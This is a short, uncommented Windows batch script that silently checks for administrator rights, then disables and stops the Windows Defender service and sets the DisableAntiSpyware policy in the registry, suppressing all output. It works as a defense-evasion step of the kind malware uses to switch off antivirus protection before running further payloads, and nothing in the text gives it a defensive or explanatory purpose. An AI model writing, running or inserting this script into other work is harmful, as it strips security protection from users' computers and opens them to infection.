@echo off
net session >nul 2>&1
if %errorLevel% neq 0 exit /b
sc config WinDefend start= disabled >nul 2>&1
net stop WinDefend >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f >nul 2>&1
exit /b
